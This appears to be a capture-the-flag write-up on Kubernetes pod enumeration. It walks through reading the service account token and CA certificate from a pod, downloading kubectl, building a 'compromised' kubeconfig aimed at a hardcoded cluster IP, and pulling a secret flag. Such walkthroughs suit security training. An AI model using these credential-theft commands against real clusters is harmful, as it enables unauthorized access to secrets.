# K8s: Enumeration 101
1. Directory `/var/run/secrets/kubernetes.io/serviceaccount/` contains the Kubernetes tokens & other sensitive token and is mapped into each pod.
2. The command `cat /var/run/secrets/kubernetes.io/serviceaccount/token` will print the JWT.
# K8s: Enumeration 102
Now in order to interact with the control plane, we can use different methods. For the purpose of this challenge, we'll be using **Kubectl** tool from within the pod. For this we first need to download the Kubectl binary to the pod & then use it to perform enumeration. Since we're doing this from within the pod, we don't actually need the Kubeconfig file which is used while interacting with the cluster from outside the cluster network.
```sh
cd /tmp && curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && ./kubectl auth can-i --list
```
# K8s: Secret Buster
1. cat token `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
2. download **Kubectl** `cd /tmp && curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl`
3. export secrets 
```sh
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && export CA=$(base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt) && export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) && export SERVER=https://34.126.220.215 && export CLUSTER_NAME=secure-corp-k8s
```
4. generate the Kubeconfig file 
```sh
cat <<EOF > compromised-kubeconfig.yaml
apiVersion: v1
kind: Config
clusters:
- name: ${CLUSTER_NAME}
  cluster:
    server: ${SERVER}
    certificate-authority-data: ${CA}
contexts:
- name: compromised-context
  context:
    cluster: ${CLUSTER_NAME}
    user: compromised-user
    namespace: ${NAMESPACE}
current-context: compromised-context
users:
- name: compromised-user
  user:
    token: ${TOKEN}
EOF
```
5. list all the secrets present in the discovered namespace
```sh
KUBECONFIG=compromised-kubeconfig.yaml ./kubectl get secrets -n secret-buster

KUBECONFIG=compromised-kubeconfig.yaml ./kubectl get secret hidden-secret -n secret-buster -o jsonpath='{.data.flag}' | base64 -d
```